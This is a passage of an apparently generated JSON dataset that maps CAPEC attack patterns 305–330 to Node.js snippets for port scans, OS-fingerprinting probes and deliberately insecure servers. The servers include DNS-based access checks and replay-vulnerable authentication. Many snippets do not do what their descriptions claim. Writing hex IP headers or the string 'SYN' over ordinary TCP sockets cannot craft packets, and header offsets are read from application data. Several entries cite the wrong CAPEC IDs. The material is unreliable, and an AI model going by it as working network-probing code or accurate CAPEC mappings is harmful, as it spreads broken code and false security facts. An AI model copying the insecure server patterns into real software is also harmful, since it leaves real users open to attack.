        "description": "This JavaScript code snippet demonstrates a TCP NULL scan, which is used to determine if a port is closed on a target machine. The code uses the 'net' module to create a TCP connection to the specified target and port. It sends an empty buffer to simulate a TCP packet with no flags set (NULL packet). If the target port is closed, the server responds with a RST (reset) packet, which is detected in the 'data' event handler. The code also includes error handling to manage potential issues during the connection attempt. This snippet embodies the main idea of CAPEC-303 (TCP Null Scan) and highlights related weaknesses such as exposure of sensitive information (CWE-200) and unchecked return values (CWE-690)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpAckScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const ackPacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002', 'hex');\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString('hex'));\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Error:', err.message);\n  });\n}\n\ntcpAckScan('192.168.0.1', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP ACK scan using Node.js. The `tcpAckScan` function attempts to connect to a specified target and port, then sends a crafted TCP ACK packet. The response is logged to the console, which can be analyzed to infer firewall or ACL configurations. This code embodies the CAPEC idea of using TCP ACK segments to gather information about firewall rules. The related CWEs are represented by potential vulnerabilities such as exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and improper access control (CWE-1280). The code is simplified for educational purposes and should not be used for unauthorized scanning."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpWindowScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    client.write('GET / HTTP/1.1\\r\\nHost: ' + target + '\\r\\n\\r\\n');\n  });\n\n  client.on('data', (data) => {\n    const windowSize = data.readUInt16BE(14); // Extract TCP Window Size from the TCP header\n    console.log(`Window Size: ${windowSize}`);\n    if (windowSize > 0) {\n      console.log('Port is open');\n    } else {\n      console.log('Port is closed');\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Error: ', err.message);\n    client.destroy();\n  });\n}\n\ntcpWindowScan('example.com', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP Window Scan. It connects to a specified target and port, sends a simple HTTP request, and then reads the TCP Window Size from the response. If the window size is positive, it infers that the port is open; otherwise, it infers that the port is closed. This code embodies the main idea of CAPEC-303 (TCP Window Scan) by attempting to infer port status based on the TCP Window Size field. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), by potentially exposing sensitive information about the target system's port status and behavior."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "const net = require('net');\nconst rpcPort = 111; // Common RPC port\n\nconst client = new net.Socket();\nclient.connect(rpcPort, 'target-host', () => {\n  console.log('Connected to RPC service');\n  client.write('RPC request data'); // CWE-200: Potential exposure of sensitive information\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-294: Replay the captured data\n  client.write(data);\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err);\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a common RPC port (111) on a target host. The client sends a request to the RPC service and logs the response. The code embodies the main idea of a 'TCP RPC Scan' by attempting to connect to an RPC service and interact with it. The snippet also highlights several related CWEs: CWE-200 (Exposure of Sensitive Information) by potentially exposing sensitive data in the request, CWE-294 (Authentication Bypass by Capture-replay) by replaying the received data, and CWE-605 (Multiple Binds to the Same Port) by illustrating a scenario where multiple connections to the same port could lead to service disruption or spoofing."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetPort = 12345;\nconst targetHost = '192.168.1.1';\n\nconst message = Buffer.from('Hello');\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response: ${msg} from ${rinfo.address}:${rinfo.port}`);\n});\n\nclient.on('error', (err) => {\n  console.log(`Client error: ${err.stack}`);\n  client.close();\n});\n\nsetTimeout(() => {\n  console.log('No response received, port might be open or filtered');\n  client.close();\n}, 5000);",
        "description": "This JavaScript code snippet demonstrates a basic UDP scan to check the status of a UDP port on a target system. It sends a UDP datagram to a specified port and waits for a response. If no response is received within a timeout period, it infers that the port might be open or filtered. This embodies the main idea of CAPEC-303 (UDP Scan). The code also touches on related CWEs: it could expose sensitive information (CWE-200) if responses are not properly handled, and it lacks integrity checks (CWE-353) for the transmitted data."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/network-info') {\n    const networkInterfaces = os.networkInterfaces();\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(networkInterfaces));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. When a request is made to the '/network-info' endpoint, it retrieves and exposes detailed network interface information using the 'os.networkInterfaces()' method. This information includes sensitive details about the network topology, such as IP addresses and network interfaces. The code embodies the main idea of CAPEC-309 (Network Topology Mapping) by exposing sensitive network information, which can be exploited by adversaries for reconnaissance. The related CWEs are represented by the exposure of sensitive information (CWE-200, CWE-497) and the excessive attack surface (CWE-1125) due to the unnecessary exposure of network details."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "const net = require('net');\nconst sensitivePorts = [21, 23, 25, 161]; // FTP, Telnet, SMTP, SNMP\nconst targetIP = '192.168.1.1';\n\nsensitivePorts.forEach(port => {\n  const client = new net.Socket();\n  client.connect(port, targetIP, () => {\n    console.log(`Port ${port} is open on ${targetIP}`);\n    client.destroy();\n  });\n  client.on('error', (err) => {\n    console.log(`Port ${port} is closed on ${targetIP}`);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a basic port scanning activity to identify open ports on a target IP address, which is a common initial step in scanning for vulnerable software (CAPEC-300). The code attempts to connect to a list of sensitive ports (FTP, Telnet, SMTP, SNMP) on the target IP. If a connection is successful, it indicates that the port is open, which could potentially expose sensitive information (CWE-200, CWE-497) or be vulnerable to attacks due to unpatched services. The code highlights the risk of excessive attack surfaces (CWE-1125) by probing multiple ports."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/os-info') {\n    // Vulnerable to information exposure\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`OS Type: ${os.type()}\nOS Platform: ${os.platform()}\nOS Release: ${os.release()}`);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. When a request is made to the '/os-info' URL, the server responds with detailed information about the operating system, such as OS type, platform, and release. This represents a vulnerability related to OS Fingerprinting (CAPEC-312 and CAPEC-313) as it exposes sensitive information about the server's operating system. This can be exploited by attackers to tailor their attacks based on the OS details. Additionally, this code snippet touches on CWE-532 (Information Exposure Through Debug Log Files) by exposing potentially sensitive information through the HTTP response."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst probePacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a800c7', 'hex');\nconst targetIP = '192.168.0.199';\nconst targetPort = 80;\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  client.write(probePacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString('hex'));\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of active OS fingerprinting. It uses the 'net' module to create a TCP client that sends a crafted probe packet to a target IP address and port. The probe packet is designed to elicit a response that can reveal information about the target's operating system based on how it handles the anomalous input. The response is then logged in hexadecimal format. This code embodies the main idea of CAPEC-312 (Active OS Fingerprinting) by attempting to detect the OS version through network probing. The related CWEs are represented by the potential exposure of sensitive information (CWE-200, CWE-497) and the observable behavioral discrepancies (CWE-207) that can be used to infer the OS type and version."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Log incoming data for passive OS fingerprinting\n    console.log(`Received data: ${data.toString()}`);\n    // Simulate analysis of data to identify OS\n    const osSignature = identifyOS(data.toString());\n    console.log(`Identified OS: ${osSignature}`);\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction identifyOS(data) {\n  // Dummy function to simulate OS identification\n  if (data.includes('Windows')) return 'Windows';\n  if (data.includes('Linux')) return 'Linux';\n  return 'Unknown OS';\n}",
        "description": "This JavaScript code snippet sets up a simple TCP server using Node.js that listens for incoming data on port 8080. When data is received, it logs the data and simulates the process of identifying the operating system based on the content of the data. This represents the concept of passive OS fingerprinting, where the server passively monitors communication to infer the OS type. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and transmitting data in cleartext (CWE-319). The 'identifyOS' function is a placeholder to demonstrate how OS signatures might be matched."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Server Error');\n      return;\n    }\n    if (hostnames.includes('trusted.domain.com')) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that performs a DNS reverse lookup on the client's IP address to make an access control decision. If the client's IP resolves to 'trusted.domain.com', access is granted; otherwise, access is denied. This code embodies the deprecated CAPEC-312 (Active OS Fingerprinting) by attempting to identify the client's origin based on IP and DNS information. It also touches on CWE-247 (Reliance on DNS Lookups in a Security Decision), highlighting the vulnerability of making security decisions based on DNS lookups, which can be unreliable and manipulated."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const message = data.toString();\n    const [timestamp, hash] = message.split(':');\n    const currentTimestamp = Math.floor(Date.now() / 1000);\n\n    // Vulnerable to replay attack: no nonce or unique identifier\n    if (Math.abs(currentTimestamp - parseInt(timestamp)) < 30) {\n      const expectedHash = crypto.createHash('sha256').update(timestamp + 'secret_key').digest('hex');\n      if (hash === expectedHash) {\n        socket.write('Authentication successful');\n      } else {\n        socket.write('Authentication failed');\n      }\n    } else {\n      socket.write('Timestamp out of range');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');",
        "description": "This JavaScript code snippet creates a TCP server that listens for incoming connections. The server expects a message containing a timestamp and a hash, separated by a colon. The server checks if the timestamp is within 30 seconds of the current time and then verifies the hash using a secret key. This code is vulnerable to a replay attack (CWE-294) because it does not use a nonce or unique identifier for each request, allowing an attacker to capture and replay a valid message within the 30-second window to bypass authentication. This demonstrates the main idea of CAPEC-312: Active OS Fingerprinting, by showing how an attacker can exploit weaknesses in network protocols to gather information or bypass security measures."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "const dns = require('dns');\nconst http = require('http');\n\nfunction isTrustedDomain(domain) {\n  return new Promise((resolve, reject) => {\n    dns.lookup(domain, (err, address) => {\n      if (err) {\n        reject('DNS lookup failed');\n      } else {\n        // Vulnerable: Making a security decision based on DNS lookup\n        if (address === '192.168.1.1') {\n          resolve(true);\n        } else {\n          resolve(false);\n        }\n      }\n    });\n  });\n}\n\nhttp.createServer((req, res) => {\n  const domain = req.headers['host'];\n  isTrustedDomain(domain).then(isTrusted => {\n    if (isTrusted) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  }).catch(err => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Server Error');\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet demonstrates a vulnerable pattern where a security decision is made based on the result of a DNS lookup, which is related to the deprecated CWE-247 (Reliance on DNS Lookups in a Security Decision). The code sets up an HTTP server that checks if the incoming request's domain is trusted by performing a DNS lookup. If the domain resolves to a specific IP address ('192.168.1.1'), access is granted; otherwise, access is denied. This approach is insecure because DNS responses can be spoofed, leading to potential security bypasses."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 12345;\n\nlet previousID = null;\n\nclient.on('message', (msg, rinfo) => {\n  const ipID = msg.readUInt16BE(4); // Read the IP ID field from the packet\n  if (previousID !== null) {\n    console.log(`IP ID Sequence: ${previousID} -> ${ipID}`);\n  }\n  previousID = ipID;\n});\n\nconst message = Buffer.from('Hello');\n\nsetInterval(() => {\n  client.send(message, 0, message.length, targetPort, targetIP, (err) => {\n    if (err) console.error(err);\n  });\n}, 1000);",
        "description": "This JavaScript code snippet demonstrates a basic UDP client that sends packets to a target IP and port, then listens for responses to analyze the IP 'ID' field sequence. The code uses the 'dgram' module to create a UDP socket and sends a message to the target at regular intervals. Upon receiving a response, it extracts the IP 'ID' field from the packet and logs the sequence of IP 'ID' values. This process can help identify the operating system of the target based on its IP 'ID' sequence generation algorithm. The code embodies the main idea of the CAPEC by probing the IP 'ID' field sequence and relates to CWE-200 (Exposure of Sensitive Information) as it potentially reveals the OS type. It also touches on CWE-291 (Reliance on IP Address for Authentication) by demonstrating how IP-based information can be exploited."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst ipID = 12345; // Arbitrary IP 'ID' value\n\nclient.on('message', (msg, rinfo) => {\n  const echoedID = msg.readUInt16BE(4); // Read the echoed IP 'ID' from the ICMP error message\n  if (echoedID === ipID) {\n    console.log('IP ID echoed back correctly, potential OS fingerprinting vulnerability detected.');\n  } else {\n    console.log('IP ID not echoed back correctly.');\n  }\n  client.close();\n});\n\nclient.send(message, 0, message.length, 12345, 'target_ip', (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. It then listens for an ICMP error message and checks if the IP 'ID' value is echoed back correctly. If the echoed IP 'ID' matches the sent value, it indicates a potential OS fingerprinting vulnerability. This code embodies the main idea of CAPEC-292 and highlights the exposure of sensitive information (CWE-200) and improper management of identifiers (CWE-1192, CWE-1302)."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst options = {\n  address: '192.168.1.1', // Target IP address\n  port: 12345, // Closed port\n  df: true // Set the Don't Fragment (DF) bit\n};\n\nclient.send(message, 0, message.length, options.port, options.address, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent with DF bit set');\n});\n\nclient.on('message', (msg, rinfo) => {\n  const dfBitSet = (msg.readUInt8(6) & 0x40) !== 0; // Check if DF bit is set in the response\n  if (dfBitSet) {\n    console.log('DF bit echoed back in response');\n  } else {\n    console.log('DF bit not echoed back in response');\n  }\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a UDP probe to test if a remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. The code sends a UDP datagram with the DF bit set to a closed port on the target IP address. It then listens for a response and checks if the DF bit is set in the response packet. This behavior can be used for OS fingerprinting, as different operating systems handle the DF bit differently. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and incorrectly specifying communication channels (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "const net = require('net');\n\nconst targetHost = 'example.com';\nconst targetPort = 80;\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target');\n  client.write('GET / HTTP/1.1\\r\\nHost: ' + targetHost + '\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  const tcpOptions = data.toString('hex').match(/0101080a[0-9a-f]{8}/);\n  if (tcpOptions) {\n    const timestamp = tcpOptions[0].slice(8);\n    console.log('TCP Timestamp:', parseInt(timestamp, 16));\n  }\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP timestamp probe, which is used for OS fingerprinting by examining the TCP timestamps in the response from a target server. The code connects to a specified target host and port, sends an HTTP GET request, and then parses the response to extract the TCP timestamp from the TCP options field. This timestamp can be used to infer the operating system of the target based on how different OSes update the timestamp value. The code embodies the CAPEC concept by showing how an attacker might probe a server to gather information about its OS. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), the possibility of timing analysis (CWE-208), and the cleartext transmission of data (CWE-319)."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "const net = require('net');\n\nfunction probeTCPSequenceNumber(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    const probePacket = Buffer.from(''); // Empty packet for simplicity\n    client.write(probePacket);\n  });\n\n  client.on('data', (data) => {\n    const sequenceNumber = data.readUInt32BE(4); // Read sequence number from TCP header\n    const acknowledgementNumber = data.readUInt32BE(8); // Read acknowledgement number from TCP header\n    console.log(`Sequence Number: ${sequenceNumber}, Acknowledgement Number: ${acknowledgementNumber}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\nprobeTCPSequenceNumber('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP sequence number probe, which is used for OS fingerprinting by analyzing the relationship between the TCP sequence number and the acknowledgement number. The code connects to a target IP and port, sends a probe packet, and then reads the sequence and acknowledgement numbers from the TCP header of the response. This information can be used to infer the operating system of the target. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and predictable sequence numbers (CWE-337)."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "const net = require('net');\n\nfunction sendSynPacket(targetHost, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetHost, () => {\n    console.log('Connected to target');\n    // Send a SYN packet (simulated)\n    client.write('SYN');\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString());\n    // Analyze ISN from SYN/ACK response\n    const isn = extractISN(data);\n    console.log('Extracted ISN:', isn);\n    // Compare ISN with known OS patterns (simulated)\n    const osType = identifyOS(isn);\n    console.log('Identified OS:', osType);\n    client.destroy();\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n  });\n}\n\nfunction extractISN(data) {\n  // Simulate ISN extraction from SYN/ACK response\n  return parseInt(data.toString().split(' ')[1], 10);\n}\n\nfunction identifyOS(isn) {\n  // Simulate OS identification based on ISN\n  const osDatabase = {\n    1000: 'Linux',\n    2000: 'Windows',\n    3000: 'MacOS'\n  };\n  return osDatabase[isn] || 'Unknown OS';\n}\n\nsendSynPacket('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'TCP (ISN) Greatest Common Divisor Probe' attack. It sends a TCP SYN packet to a target host and port, receives the SYN/ACK response, and extracts the Initial Sequence Number (ISN) from the response. The extracted ISN is then compared against a simulated database of known OS patterns to identify the operating system of the target. This code embodies the main idea of the CAPEC by illustrating how an attacker can use ISN analysis for OS fingerprinting. The related CWEs are represented by the potential exposure of sensitive information (ISN) to unauthorized actors and the cleartext transmission of this information, which can be sniffed and analyzed."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "const crypto = require('crypto');\n\nlet lastISN = crypto.randomInt(0, 2**32);\nlet lastTime = Date.now();\n\nfunction generateISN() {\n  const currentTime = Date.now();\n  const timeDiff = currentTime - lastTime;\n  lastTime = currentTime;\n  lastISN += timeDiff;\n  return lastISN;\n}\n\n// Simulate ISN generation over time\nsetInterval(() => {\n  console.log(`Generated ISN: ${generateISN()}`);\n}, 1000);",
        "description": "This JavaScript code snippet simulates the generation of TCP Initial Sequence Numbers (ISNs) using a time-based algorithm. The `generateISN` function increments the ISN based on the time elapsed since the last ISN was generated. This approach is vulnerable to timing analysis, as an attacker can measure the rate of ISN increments to infer the underlying operating system, aligning with the CAPEC description. The code also touches on CWE-385 (Covert Timing Channel) by demonstrating how timing information can be used to infer sensitive data. Additionally, the use of `Date.now()` introduces a potential CWE-367 (TOCTOU Race Condition) if the time source is manipulated between checks."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateISN() {\n  // Predictable seed based on current time\n  const seed = Date.now();\n  const random = crypto.createHash('sha256').update(seed.toString()).digest('hex');\n  // Convert to a number and take a portion to simulate ISN\n  const isn = parseInt(random.substring(0, 8), 16);\n  return isn;\n}\n\nconsole.log('Generated ISN:', generateISN());",
        "description": "This JavaScript code snippet demonstrates the generation of an Initial Sequence Number (ISN) for a TCP connection using a predictable seed, which is based on the current time (Date.now()). The code uses the SHA-256 hash function to create a pseudo-random number from the seed. However, because the seed is predictable (current time), the generated ISN can be estimated by an attacker. This embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe' by showing how an attacker could predict the sequence number generation algorithm. The related CWEs are represented as follows: CWE-337 (Predictable Seed in PRNG) is shown by using the current time as the seed, CWE-341 (Predictable from Observable State) is demonstrated by the predictability of the seed, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is implied as the predictable ISN could be exploited by an attacker."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst ECN_FLAG = 0x02; // Example ECN flag\n\nclient.connect(80, 'example.com', () => {\n  console.log('Connected to server');\n  const packet = Buffer.from([0x45, 0x00, 0x00, 0x28, 0xab, 0xcd, 0x40, 0x00, 0x40, ECN_FLAG, 0x00, 0x00, 0x7f, 0x00, 0x00, 0x01, 0x7f, 0x00, 0x00, 0x01]);\n  client.write(packet);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data.toString('hex'));\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that connects to a server and sends a packet with an ECN (Explicit Congestion Notification) flag. The ECN flag is set in the packet to probe the server's response, which can be used for OS fingerprinting. The code demonstrates the CAPEC concept of probing for ECN support to identify the operating system based on its response. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), improper protection of error messages (CWE-1320), and the cleartext transmission of the packet (CWE-319). The code does not include integrity checks (CWE-353) and does not control the volume of network messages (CWE-406), making it vulnerable to network amplification attacks."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "const net = require('net');\n\nfunction tcpInitialWindowSizeProbe(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    console.log('Connected to target');\n    // Send a SYN packet to initiate TCP handshake\n    client.write('SYN');\n  });\n\n  client.on('data', (data) => {\n    // Extract the initial window size from the SYN-ACK response\n    const initialWindowSize = data.readUInt16BE(14); // Simplified extraction\n    console.log(`Initial Window Size: ${initialWindowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\ntcpInitialWindowSizeProbe('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Initial Window Size Probe, which is used for OS fingerprinting by checking the initial TCP window size. The code establishes a TCP connection to a target IP and port, sends a SYN packet to initiate the TCP handshake, and then reads the initial window size from the SYN-ACK response. This information can be used to infer the operating system of the target. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200) and reliance on data/memory layout (CWE-188), as it assumes a specific structure of the TCP packet."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "const net = require('net');\n\nconst options = {\n  host: 'target_host',\n  port: 80,\n  localAddress: '0.0.0.0',\n  localPort: 0,\n  family: 4,\n  hints: net.ADDRCONFIG | net.V4MAPPED,\n  lookup: (hostname, options, callback) => {\n    // Custom DNS lookup logic\n    callback(null, 'target_ip', 4);\n  }\n};\n\nconst client = net.createConnection(options, () => {\n  console.log('Connected to server!');\n  client.write('GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  console.log('Received data:', data.toString());\n  // Analyze TCP options in the response\n  const tcpOptions = extractTCPOptions(data);\n  console.log('TCP Options:', tcpOptions);\n  client.end();\n});\n\nclient.on('end', () => {\n  console.log('Disconnected from server');\n});\n\nfunction extractTCPOptions(data) {\n  // Placeholder function to extract TCP options from the response\n  // This would involve parsing the TCP header and extracting options\n  return [];\n}",
        "description": "This JavaScript code snippet demonstrates a TCP connection to a target host, sending a basic HTTP GET request, and then analyzing the TCP options in the response. The main idea is to perform OS fingerprinting by examining the type and order of TCP header options in the response segment. This can reveal information about the target operating system, as different OS implementations use unique ways of ordering or structuring TCP options. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) through the analysis of TCP options and making assumptions about protocol data layout (CWE-188)."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'example.com', () => {\n  console.log('Connected');\n  // Sending a RST packet with a human-readable message\n  const rstPacket = Buffer.from('HTTP/1.1 400 Bad Request\\r\\n\\r\\n');\n  client.write(rstPacket);\n  client.destroy(); // Close the connection\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that connects to a server on port 80. Upon connection, it sends a RST (reset) packet containing a human-readable message ('HTTP/1.1 400 Bad Request'). This simulates the CAPEC scenario where an attacker sends a RST packet with a text payload to probe for OS fingerprinting. The code also listens for any data received from the server and logs it, then closes the connection. This demonstrates the potential exposure of sensitive information (CWE-200) and the lack of integrity checks (CWE-353, CWE-354) in the transmission."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message with sensitive information\n  const errorMessage = `ICMP Error: Port Unreachable. Original message: ${msg.toString()}`;\n  server.send(errorMessage, 0, errorMessage.length, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. When the server receives a message, it logs the message and the sender's information. It then simulates an ICMP error message (Port Unreachable) that includes the original message content, which could contain sensitive information. This demonstrates the CAPEC concept of generating an ICMP error message and quoting the original request, potentially exposing sensitive information (CWE-200, CWE-211, CWE-209). The code also handles server errors by logging them, which could inadvertently expose sensitive information (CWE-210)."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  const icmpErrorMessage = Buffer.from('ICMP Error: Destination Unreachable');\n  server.send(icmpErrorMessage, 0, icmpErrorMessage.length, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending ICMP message:', err);\n  });\n});\n\nserver.bind(41234, () => {\n  console.log('Server listening on port 41234');\n});",
